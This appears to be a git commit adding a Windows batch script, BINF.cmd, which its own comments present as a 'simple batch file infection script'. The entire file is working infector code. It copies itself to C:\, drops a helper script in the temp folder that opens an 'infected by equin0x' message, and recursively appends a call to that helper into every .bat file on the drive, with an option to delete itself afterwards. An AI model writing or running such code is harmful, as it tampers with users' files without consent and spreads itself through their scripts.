81c69ac5c25238c7fdca3972711d58e5db183b3a
equin0x <nope@equin0x.com>
2012-07-31 15:21:58 -0400

    BINF.CMD
    Simple batch file infection

---
+++ BINF.cmd
@@ -0,0 +1,19 @@
+::Simple batch file infection script.
+::VAR
+SET DELONEXIT=0
+SET DIR=C:\
+::START
+@ECHO OFF
+CD %DIR%
+COPY %0 %DIR%
+IF EXIST %TEMP%\RUNDLL.CMD DEL %TEMP%\RUNDLL.CMD
+IF EXIST %TEMP%\INF.TXT DEL %TEMP%\INF.TXT
+ECHO @ECHO OFF >> %TEMP%\RUNDLL.CMD
+ECHO START NOTEPAD.EXE %TEMP%\INF.TXT >> %TEMP%\RUNDLL.CMD
+ECHO This file has been infected by equin0x. > %TEMP%\INF.TXT
+for /f %%A in ('DIR /B /S *.bat') do (
+		if not "%%A"=="%0" ECHO CALL %TEMP%\RUNDLL.CMD >> %%A
+)
+::END
+IF "%DELONEXIT%"=="1" DEL %0
+IF NOT "%DELONEXIT%"=="1" EXIT
